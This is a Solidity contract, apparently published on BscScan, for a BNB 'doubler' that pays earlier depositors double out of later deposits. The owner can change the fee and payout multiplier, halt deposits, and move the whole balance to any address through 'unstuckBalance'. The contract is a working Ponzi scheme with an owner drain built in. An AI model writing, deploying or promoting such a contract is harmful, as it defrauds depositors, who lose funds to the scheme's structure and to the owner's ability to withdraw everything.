/**
 *Submitted for verification at BscScan.com on 2022-12-21
*/

// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.7.4;



contract xdouble {

    struct user{
        uint256 amount;
        address userAddr;
    }

    modifier onlyOwner{
        require(msg.sender == owner);
        _;
    }

    address owner = 0x60E9C952b6DB8B9590080BF6c9BD2298a5f207c5;

    mapping(uint256 => user) public IDToUser;
    uint256 public currentID;
    uint256 public totalID;

    uint256 maxBNBAccepted = 100000000000000000;
    uint256 MIN = 10000000000000000;
    uint256 devFeePercentage = 12;

    uint256 gainsMultiplier = 2;

    function setDevFeePercentage(uint256 percent) public onlyOwner{
        devFeePercentage = percent;
    }

    function setGainsMultiplier(uint256 gm) public onlyOwner{
        require (gm > 0);
        gainsMultiplier = gm;
    }

    function setMINMaxBNBAccepted(uint256 MinBNB, uint256 maxBNBAccept) public onlyOwner{
        maxBNBAccepted = maxBNBAccept;
        MIN = MinBNB;
    }

    bool allowTransfer = true;

    function setAllowTransfer(bool b) public onlyOwner{
        allowTransfer = b;
    }

    function unstuckBalance(address receiver) public onlyOwner{
        uint256 contractETHBalance = address(this).balance;
        payable(receiver).transfer(contractETHBalance);
    }

    receive() payable external {
        require(msg.value >= MIN && msg.value <= maxBNBAccepted && allowTransfer == true);
        IDToUser[totalID].userAddr = msg.sender;
        IDToUser[totalID].amount = msg.value;
        totalID++;
        uint256 devBalance = (msg.value * devFeePercentage) > 100 ? (msg.value * devFeePercentage) / 100 : 0;
        payable(owner).transfer(devBalance);

        uint256 availableBalance = address(this).balance;
        uint256 amountToSend = IDToUser[currentID].amount;
        if(availableBalance >= amountToSend * gainsMultiplier){
            payable(IDToUser[currentID].userAddr).transfer(amountToSend * gainsMultiplier);
            currentID++;
        }     
    }
        

}